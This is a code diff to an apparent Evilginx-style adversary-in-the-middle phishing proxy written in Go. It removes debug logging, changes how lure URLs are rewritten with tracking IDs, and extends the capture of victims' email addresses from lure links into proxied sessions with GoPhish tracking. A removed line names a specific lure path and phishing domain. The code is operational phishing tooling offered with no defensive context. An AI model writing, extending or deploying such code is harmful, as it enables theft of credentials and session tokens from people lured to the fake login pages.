@@ -52,134 +52,100 @@ var tidUrlMap = struct {
 }{m: make(map[string]string)}
 
 func genTid() string {
-	return strconv.FormatInt(rand.Int63(), 10)
+	// Generate four 8-digit numbers separated by hyphens
+	// Format: xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx
+	part1 := fmt.Sprintf("%08d", rand.Intn(100000000))
+	part2 := fmt.Sprintf("%08d", rand.Intn(100000000))
+	part3 := fmt.Sprintf("%08d", rand.Intn(100000000))
+	part4 := fmt.Sprintf("%08d", rand.Intn(100000000))
+	return part1 + "-" + part2 + "-" + part3 + "-" + part4
 }
 
 // Check if request matches a rewrite rule, return (rewrite, tid) if so
 func checkAndRewriteRequest(pl *Phishlet, req *http.Request) (redirectUrl string, tid string, matched bool) {
-	log.Debug("=== REWRITE DEBUG START ===")
-	log.Debug("rewrite_url: checking request - Host: '%s', Path: '%s', RawQuery: '%s'", req.Host, req.URL.Path, req.URL.RawQuery)
-	
 	if pl == nil {
-		log.Debug("rewrite_url: phishlet is nil, skipping")
 		return "", "", false
 	}
-	log.Debug("rewrite_url: phishlet name: '%s'", pl.Name)
 	
 	host := req.Host
 	path := req.URL.Path
-	log.Debug("rewrite_url: checking %d rewrite rules", len(pl.rewriteUrls))
-	for i, ru := range pl.rewriteUrls {
-		log.Debug("rewrite_url: checking rule %d - trigger domains: %v, trigger paths: %v", i+1, ru.triggerDomains, ru.triggerPaths)
+	
+	for _, ru := range pl.rewriteUrls {
 		domainMatch := false
 		for _, d := range ru.triggerDomains {
-			log.Debug("rewrite_url: comparing domain '%s' with host '%s'", d, host)
 			if d == host {
 				domainMatch = true
-				log.Debug("rewrite_url: matched domain '%s' for path '%s'", d, path)
 				break
 			}
 		}
 		if !domainMatch {
-			log.Debug("rewrite_url: domain did not match, skipping rule %d", i+1)
 			continue
 		}
-		log.Debug("rewrite_url: domain matched, checking paths")
+		
 		for _, triggerPath := range ru.triggerPaths {
-			log.Debug("rewrite_url: comparing path '%s' with trigger path '%s'", path, triggerPath)
 			if triggerPath == path {
-				log.Debug("rewrite_url: PATH MATCHED! Generating TID and processing rewrite")
 				tid = genTid()
-				log.Debug("rewrite_url: generated TID: '%s'", tid)
 				
 				origUrl := path
-				log.Debug("rewrite_url: original URL path: '%s'", origUrl)
-				
 				if req.URL.RawQuery != "" {
 					origUrl += "?" + req.URL.RawQuery
-					log.Debug("rewrite_url: original URL with query: '%s'", origUrl)
 				}
 				
-				log.Debug("rewrite_url: storing original URL '%s' with TID '%s'", origUrl, tid)
 				tidUrlMap.Lock()
 				tidUrlMap.m[tid] = origUrl
 				tidUrlMap.Unlock()
+				
 				// Parse original query parameters
 				origQuery, _ := url.ParseQuery(req.URL.RawQuery)
-				log.Debug("rewrite_url: original query parameters: %v", origQuery)
 				
 				// Build new query parameters starting with original ones
 				q := url.Values{}
-				log.Debug("rewrite_url: building new query parameters")
 				for key, values := range origQuery {
 					for _, value := range values {
 						q.Add(key, value)
-						log.Debug("rewrite_url: preserving parameter %s=%s", key, value)
 					}
 				}
 				
 				// Add rewrite query parameters (overriding if needed)
-				log.Debug("rewrite_url: adding rewrite query parameters: %v", ru.rewriteQuery)
 				for _, qv := range ru.rewriteQuery {
 					val := qv.Value
 					if val == "{id}" {
 						val = tid
-						log.Debug("rewrite_url: replacing {id} with TID: '%s'", tid)
 					}
 					q.Set(qv.Key, val)
-					log.Debug("rewrite_url: set rewrite parameter %s=%s", qv.Key, val)
 				}
 				redirectUrl = ru.rewritePath
-				log.Debug("rewrite_url: rewrite path: '%s'", redirectUrl)
 				if len(q) > 0 {
 					redirectUrl += "?" + q.Encode()
-					log.Debug("rewrite_url: final URL with query: '%s'", redirectUrl)
 				}
-				log.Debug("rewrite_url: final query parameters: %v", q)
-				log.Debug("rewrite_url: redirecting to '%s' with tid '%s'", redirectUrl, tid)
-				log.Debug("=== REWRITE DEBUG END ===")
 				return redirectUrl, tid, true
 			}
 		}
 	}
-	log.Debug("rewrite_url: no rewrite rules matched")
-	log.Debug("=== REWRITE DEBUG END ===")
 	return "", "", false
 }
 
 // If request is to a rewritten URL, restore original URL
 func restoreOriginalUrlIfTid(req *http.Request) bool {
-	log.Debug("=== RESTORE DEBUG START ===")
-	log.Debug("restoreOriginalUrlIfTid: checking request - Host: '%s', Path: '%s', RawQuery: '%s'", req.Host, req.URL.Path, req.URL.RawQuery)
-	
 	tid := req.URL.Query().Get("tid")
 	if tid == "" {
-		log.Debug("restoreOriginalUrlIfTid: no TID found in query")
 		return false
 	}
-	log.Debug("restoreOriginalUrlIfTid: found TID '%s'", tid)
+	
 	tidUrlMap.RLock()
 	orig, ok := tidUrlMap.m[tid]
 	tidUrlMap.RUnlock()
 	if !ok {
-		log.Debug("restoreOriginalUrlIfTid: TID '%s' not found in map", tid)
 		return false
 	}
-	log.Debug("restoreOriginalUrlIfTid: found original URL '%s' for TID '%s'", orig, tid)
 	
 	u, err := url.Parse(orig)
 	if err != nil {
-		log.Debug("restoreOriginalUrlIfTid: failed to parse original URL: %v", err)
 		return false
 	}
 	
-	log.Debug("restoreOriginalUrlIfTid: restoring path from '%s' to '%s'", req.URL.Path, u.Path)
-	log.Debug("restoreOriginalUrlIfTid: restoring query from '%s' to '%s'", req.URL.RawQuery, u.RawQuery)
-	
 	req.URL.Path = u.Path
 	req.URL.RawQuery = u.RawQuery
-	log.Debug("restoreOriginalUrlIfTid: restored original URL '%s' for tid '%s'", req.URL.String(), tid)
-	log.Debug("=== RESTORE DEBUG END ===")
 	return true
 }
 
@@ -295,26 +261,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	p.Proxy.OnRequest().
 		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
-			log.Debug("=== PROXY REQUEST START ===")
-			log.Debug("proxy: incoming request - Host: '%s', Path: '%s', RawQuery: '%s'", req.Host, req.URL.Path, req.URL.RawQuery)
-			
 			// --- Begin rewrite_urls logic ---
 			pl := p.getPhishletByPhishHost(req.Host)
-			if pl != nil {
-				log.Debug("proxy: found phishlet '%s' for host '%s'", pl.Name, req.Host)
-			} else {
-				log.Debug("proxy: no phishlet found for host '%s'", req.Host)
-			}
 			
 			if restoreOriginalUrlIfTid(req) {
-				log.Debug("proxy: URL restored, continuing as normal")
+				// URL was restored, continue normal processing
 			} else if redirectUrl, _, matched := checkAndRewriteRequest(pl, req); matched {
-				log.Debug("proxy: rewrite matched, redirecting to '%s'", redirectUrl)
 				resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 				resp.Header.Add("Location", redirectUrl)
 				return req, resp
-			} else {
-				log.Debug("proxy: no rewrite rules matched, continuing with normal processing")
 			}
 			// --- End rewrite_urls logic ---
 			ps := &ProxySession{
@@ -475,6 +430,26 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							create_session = false
 							ps.SessionId = sc.Value
 							p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
+							
+							// Extract email parameter from URL for existing session
+							email := req.URL.Query().Get("email")
+							if email != "" {
+								// Get the existing session and update email parameter
+								if session, exists := p.sessions[ps.SessionId]; exists {
+									session.Params["email"] = email
+									log.Important("[%s] Email updated in existing session: %s", pl_name, email)
+								}
+							} else {
+								// Only remove email if it's explicitly empty (email=) not if it's missing
+								if req.URL.Query().Has("email") {
+									if session, exists := p.sessions[ps.SessionId]; exists {
+										if _, hasEmail := session.Params["email"]; hasEmail {
+											delete(session.Params, "email")
+											log.Important("[%s] Email removed from existing session (explicitly empty)", pl_name)
+										}
+									}
+								}
+							}
 						} else {
 							log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
 						}
@@ -538,15 +513,20 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									// set params from url arguments
 									p.extractParams(session, req.URL)
 									
-									// Check for email parameter in lure URL
-									if req.URL.Path == "/AchRCajN" && req.Host == "login.techinb.fr" {
-										email := req.URL.Query().Get("email")
-										if email != "" {
-											log.Important("🎯 LURE EMAIL CAPTURED: %s", email)
-											session.Params["email"] = email  // Save to session parameters
-											log.Debug("Email saved to session %s: %s", session.Id, email)
+									// Extract email parameter from URL if present
+									email := req.URL.Query().Get("email")
+									if email != "" {
+										// Always overwrite any previous email value
+										session.Params["email"] = email
+										log.Important("[%s] Email captured from URL: %s", pl_name, email)
+									} else {
+										// Email parameter not found or empty - check if email exists in session and delete it
+										if _, hasEmail := session.Params["email"]; hasEmail {
+											delete(session.Params, "email")
+											log.Important("[%s] Email removed from new session", pl_name)
 										}
 									}
+
 
 									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
 										if trackParam, ok := session.Params["o"]; ok {
